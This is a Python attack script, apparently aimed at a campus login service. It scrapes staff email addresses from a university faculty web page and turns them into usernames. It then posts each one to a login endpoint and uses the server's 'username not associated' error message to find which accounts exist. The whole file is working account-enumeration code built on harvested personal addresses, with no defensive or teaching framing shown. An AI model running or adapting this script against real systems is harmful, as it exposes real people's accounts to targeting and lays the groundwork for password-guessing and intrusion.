import re
import requests
from bs4 import BeautifulSoup


url = 'https://csc.calpoly.edu/faculty/'

curl_url = "http://129.65.51.244:5000/login"
def curl_request(username):
    
# Data to send in the POST request
    data = {
        "user": username,
        "password": "PasswordHere"
    }

# Send the POST request
    response = requests.post(curl_url, data=data)

# Print the response That username is not associatd with an account.
    response_text = response.text.strip()
    if (response_text) == ("That username is not associatd with an account."):
        return 0
    return username

def scrap(url):
# URL of the webpage to scrape
# Headers to mimic a browser
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
    }

# Send a GET request to the webpage with headers
    response = requests.get(url, headers=headers)
    response.raise_for_status()  # Ensure the request was successful

# Parse the webpage content
    soup = BeautifulSoup(response.text, 'html.parser')

# Convert the soup object to a string
    content = str(soup)

# Define a refined email pattern to avoid concatenated errors
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b'

# Find all email addresses in the content
    emails = re.findall(email_pattern, content)

# Remove duplicates by converting the list to a set
    unique_emails = set(emails)

# Sort and filter emails (optional step for clean output)
    filtered_emails = sorted(email for email in unique_emails if '@' in email and '.' in email)
    return filtered_emails

filtered_emails = scrap(url)    
username_list = []
# Print the cleaned email addresses
for email in filtered_emails:
    if email.endswith('@calpoly.edu'):
        email = email.replace('@calpoly.edu', '')
        username_list.append(email)

for username in username_list:
    creds = curl_request(username)
    if (creds):
        print(creds)
        break

